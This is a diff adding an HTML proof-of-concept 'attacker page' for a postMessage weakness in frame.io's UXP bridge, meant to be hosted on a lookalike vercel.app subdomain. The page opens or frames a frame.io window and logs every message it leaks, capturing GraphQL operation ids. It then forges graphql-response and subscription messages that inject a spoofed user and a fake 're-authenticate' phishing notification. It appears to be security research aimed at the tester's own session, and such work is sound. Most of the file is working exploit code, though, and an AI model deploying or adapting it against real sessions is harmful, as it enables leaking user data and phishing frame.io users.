@@ -1,0 +1,91 @@
+<!doctype html>
+<!--
+  ATTACKER PAGE — deploy at https://<something>-frameio.vercel.app/
+  Purpose: empirically answer the two open questions for finding "C":
+    Q1 (handle):  can this page obtain a usable window handle to a UXP-active frame.io window?
+    Q2 (leak):    does that frame.io window post its outbound GraphQL ops to us (targetOrigin:'*')?
+    Q3 (inject):  does a forged graphql-response / graphql-subscription-data get accepted?
+  Nothing here attacks a third party — point it only at your own test frame.io session.
+-->
+<meta charset="utf-8">
+<title>uxp-bridge probe</title>
+<style>body{font:13px monospace;margin:16px}#log{white-space:pre-wrap;border:1px solid #ccc;padding:8px;height:60vh;overflow:auto}button,input{font:inherit;margin:2px}</style>
+<h3>frame.io UXP postMessage probe (origin = <span id="org"></span>)</h3>
+
+<div>
+  target URL:
+  <input id="url" size="70" value="https://next.frame.io/?uxp=1">
+  <button id="open">window.open()</button>
+  <button id="iframe">try iframe</button>
+</div>
+<div>
+  forge id: <input id="fid" size="24" placeholder="captured/guessed op id">
+  <button id="resp">send graphql-response</button>
+  <button id="sub">send graphql-subscription-data</button>
+  <button id="probe">send benign ping</button>
+</div>
+<div id="log"></div>
+<iframe id="fr" style="display:none;width:600px;height:400px"></iframe>
+
+<script>
+const $ = s => document.querySelector(s);
+const log = (...a) => { const l=$('#log'); l.textContent += a.map(x=>typeof x==='string'?x:JSON.stringify(x)).join(' ')+'\n'; l.scrollTop=l.scrollHeight; };
+$('#org').textContent = location.origin;
+let handle = null;             // WindowProxy we can postMessage to
+let lastSeenId = null;
+
+// ---- Q2: log EVERY message we receive, with its origin. This proves/disproves the
+//          targetOrigin:'*' outbound leak and captures real operation ids.
+addEventListener('message', (e) => {
+  let d = e.data;
+  log('⬅️  MSG from', e.origin, '| keys:', d && typeof d==='object' ? Object.keys(d).join(',') : typeof d);
+  try {
+    if (d && (d.type||'').toString().startsWith('graphql')) {
+      log('    type=', d.type, ' id=', d.id, ' opName=', d.operationName || (d.payload&&d.payload.operationName));
+      if (d.id) { lastSeenId = d.id; $('#fid').value = d.id; log('    >>> captured id -> filled forge box'); }
+    } else {
+      log('    data=', JSON.stringify(d).slice(0,300));
+    }
+  } catch(_){}
+});
+
+// ---- Q1: acquire a handle via window.open (opener relationship) ----
+$('#open').onclick = () => {
+  const u = $('#url').value;
+  handle = window.open(u, 'frameio_probe');
+  log(handle ? '✅ window.open returned a handle (opener channel open). Now interact in that window so it emits ops.'
+             : '❌ window.open returned null (popup blocked).');
+};
+
+// alt handle: try to iframe it (will fail if frame.io sets frame-ancestors/XFO)
+$('#iframe').onclick = () => {
+  const fr = $('#fr'); fr.style.display='block'; fr.src = $('#url').value;
+  fr.onload = () => { try { handle = fr.contentWindow; log('iframe loaded; using contentWindow as handle'); }
+                      catch(e){ log('iframe loaded but cross-origin (expected)'); handle = fr.contentWindow; } };
+  setTimeout(()=>{ log('NOTE: if the frame stays blank, frame.io blocks framing (CSP frame-ancestors / X-Frame-Options) -> iframe vector dead.'); }, 1500);
+};
+
+// ---- Q3: forged inbound messages (the injection itself) ----
+function send(msg){
+  if(!handle){ log('no handle yet — click window.open or iframe first'); return; }
+  // post with no targetOrigin restriction; the victim's isValidOrigin() is what we are testing
+  handle.postMessage(msg, '*');
+  log('➡️  SENT', JSON.stringify(msg).slice(0,300));
+}
+$('#resp').onclick = () => send({
+  type:'graphql-response',
+  id: $('#fid').value || lastSeenId || '1',
+  result:{ data:{ __spoof:true,
+    me:{ id:'attacker', name:'ATTACKER-INJECTED', email:'pwned@evil.test', __typename:'User' } } }
+});
+$('#sub').onclick = () => send({
+  type:'graphql-subscription-data',
+  id: $('#fid').value || lastSeenId || '1',
+  result:{ data:{ __spoof:true,
+    notification:{ id:'x', message:'Click here to re-authenticate', __typename:'Notification' } } }
+});
+$('#probe').onclick = () => send({ type:'graphql-ping', id:'probe', ts:Date.now() });
+
+log('ready. origin =', location.origin);
+log('does origin end with "-frameio.vercel.app"? ->', location.hostname.endsWith('-frameio.vercel.app'));
+</script>
